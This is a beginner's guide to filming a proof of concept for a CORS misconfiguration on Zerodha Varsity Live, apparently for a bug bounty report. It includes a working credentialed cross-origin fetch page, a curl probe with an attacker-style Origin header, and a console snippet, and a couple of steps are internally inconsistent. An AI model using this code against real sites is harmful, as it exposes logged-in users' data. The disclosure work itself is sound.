# CORS PoC Video Guide — Step by Step for Beginners
## Zerodha Varsity Live — CORS Misconfiguration

---

## What You Need
- A browser (Chrome or Firefox)
- A Zerodha account (free to create)
- OBS Studio or any screen recorder
- 15 minutes

---

## PHASE 1 — Setup (One-time, 5 mins)

### Step 1: Create Your PoC HTML File

Copy this exact code and save it as `cors_poc.html` on your Desktop:

```html
<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - Zerodha Varsity Live</title>
  <style>
    body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
    h2 { color: #ff4444; }
    pre { background: #000; padding: 15px; border: 1px solid #00ff00;
          white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; }
    .label { color: #ffaa00; font-weight: bold; }
  </style>
</head>
<body>
  <h2>🔴 CORS PoC — Zerodha Varsity Live</h2>
  <p>Attacker origin: <strong id="origin"></strong></p>
  <p>Target: <strong>https://varsitylive.zerodha.com</strong></p>
  <hr>
  <div class="label">ACAO Header Reflected:</div>
  <pre id="cors-header">Checking...</pre>
  <div class="label">ACAC (Credentials Allowed):</div>
  <pre id="creds-header">Checking...</pre>
  <div class="label">Response Body (first 300 chars):</div>
  <pre id="body-output">Fetching with your cookies...</pre>

  <script>
    document.getElementById('origin').textContent = window.location.origin;

    fetch('https://varsitylive.zerodha.com/', {
      method: 'GET',
      credentials: 'include',
      mode: 'cors'
    })
    .then(response => {
      // Show CORS response headers
      document.getElementById('cors-header').textContent =
        'Access-Control-Allow-Origin: ' +
        (response.headers.get('access-control-allow-origin') || 'NOT SET');

      document.getElementById('creds-header').textContent =
        'Access-Control-Allow-Credentials: ' +
        (response.headers.get('access-control-allow-credentials') || 'NOT SET');

      return response.text();
    })
    .then(body => {
      document.getElementById('body-output').textContent =
        '✅ CROSS-ORIGIN READ SUCCESSFUL!\n\n' +
        'Body (first 300 chars):\n' +
        body.substring(0, 300) + '...';
    })
    .catch(err => {
      document.getElementById('body-output').textContent = '❌ Blocked: ' + err;
    });
  </script>
</body>
</html>
```

---

## PHASE 2 — Record the Video (Follow this exact order)

### 🎬 Start your screen recorder NOW before doing anything else

Open OBS Studio → click **Start Recording**

---

### 🎥 Scene 1 — Show the Target (30 seconds)

1. Open Chrome
2. Go to `https://varsitylive.zerodha.com`
3. **Say or type in the recording:** "This is the target — Varsity Live by Zerodha"
4. Show the page loads normally

---

### 🎥 Scene 2 — Log In to Varsity Live (1 minute)

1. Click Login / Sign Up on Varsity Live
2. Log in with your Zerodha account
3. After login, you should see your profile/dashboard
4. **This proves you have an active session (cookies set)**

> ⚠️ If Varsity Live doesn't require login for basic pages, just show you have Zerodha
> cookies set — open DevTools → Application → Cookies → zerodha.com

---

### 🎥 Scene 3 — Show the Vulnerability with curl (1 minute)

Open a terminal and run this command:

```bash
curl -s -D - \
  -H "Origin: https://evil-attacker.com" \
  -H "User-Agent: Mozilla/5.0" \
  https://varsitylive.zerodha.com \
  | grep -i "access-control"
```

**Expected output you should show:**
```
access-control-allow-credentials: true
access-control-allow-methods: GET, HEAD
access-control-allow-origin: https://evil-attacker.com
```

Highlight/zoom into these 3 lines — this is the **core evidence**.

---

### 🎥 Scene 4 — Run the PoC HTML File (2 minutes — MOST IMPORTANT)

1. Open a new Chrome tab
2. Press `Ctrl+L` (address bar) and type the path to your file:
   ```
   file:///home/prasanth/Desktop/cors_poc.html
   ```
   (or drag the file into the browser)

3. The page will show:
   - Your current origin (file:// or localhost)
   - The ACAO header reflecting your origin ← **ZOOM INTO THIS**
   - The body being read cross-origin ← **ZOOM INTO THIS**

4. Open **Chrome DevTools** (F12) → **Network** tab
5. Refresh the page with DevTools open
6. Click on the `varsitylive.zerodha.com` request in Network tab
7. Show the **Response Headers**:
   - `access-control-allow-origin: file://` or `null`
   - `access-control-allow-credentials: true`

> **Note:** If `file://` origin gets blocked, serve it from localhost instead — see Bonus step below

---

### 🎥 Scene 5 — Show in Browser Console (1 minute)

1. Go to `https://varsitylive.zerodha.com` in Chrome (logged in)
2. Open DevTools → **Console** tab (F12 → Console)
3. Paste this and press Enter:

```javascript
fetch('https://varsitylive.zerodha.com/', {
  credentials: 'include',
  mode: 'cors'
}).then(r => {
  console.log('ACAO:', r.headers.get('access-control-allow-origin'));
  console.log('ACAC:', r.headers.get('access-control-allow-credentials'));
  return r.text();
}).then(b => console.log('Body read cross-origin! First 200 chars:', b.slice(0,200)));
```

4. Show the console output — **it prints the response body** ← this is your proof

---

### 🎥 Scene 6 — Show Network Tab Evidence (1 minute)

1. DevTools → **Network** tab
2. Click the request to `varsitylive.zerodha.com`
3. Click **Headers** tab
4. Scroll to **Response Headers**
5. Show and zoom in on:
   ```
   access-control-allow-credentials: true
   access-control-allow-origin: https://evil.com
   ```

6. Click the **Response** tab — show the body is readable

---

### 🎬 Stop Recording

---

## PHASE 3 — Serve from Localhost (if file:// gets blocked)

If the browser blocks `file://` origin, do this instead:

```bash
# In terminal, from the folder containing cors_poc.html:
cd ~/Desktop
python3 -m http.server 8080
```

Then open `http://localhost:8080/cors_poc.html` — now the Origin is `http://localhost:8080`
and it will still be reflected by the server, proving arbitrary origin acceptance.

---

## PHASE 4 — Edit the Video (Optional but recommended)

Use any video editor (even VLC or Shotcut):
1. Trim dead air at start/end
2. Add text annotations highlighting the key headers
3. Keep it under 3 minutes
4. Export as MP4 (max 30MB for Zerodha submission)

---

## What Your Video Should Prove (Checklist)

- [ ] You are logged into Zerodha / have an active session
- [ ] The curl command shows `access-control-allow-origin` reflecting your arbitrary origin
- [ ] `access-control-allow-credentials: true` is present in the response
- [ ] The PoC HTML page (or console snippet) successfully reads the response body cross-origin
- [ ] No CORS block error in the browser console

---

## Common Issues & Fixes

| Problem | Fix |
|---|---|
| `file://` origin gets blocked | Use `python3 -m http.server 8080` and open `localhost:8080` |
| fetch() gives CORS error | You're already ON the target domain; open the PoC from a different origin |
| Response body is the SPA shell (not user data) | That's fine — the issue is the ACAO header reflecting evil.com WITH credentials |
| Zerodha login fails | Create a free Zerodha account at zerodha.com/open-account |
| Video file too large | Re-export at 720p, 1Mbps bitrate |
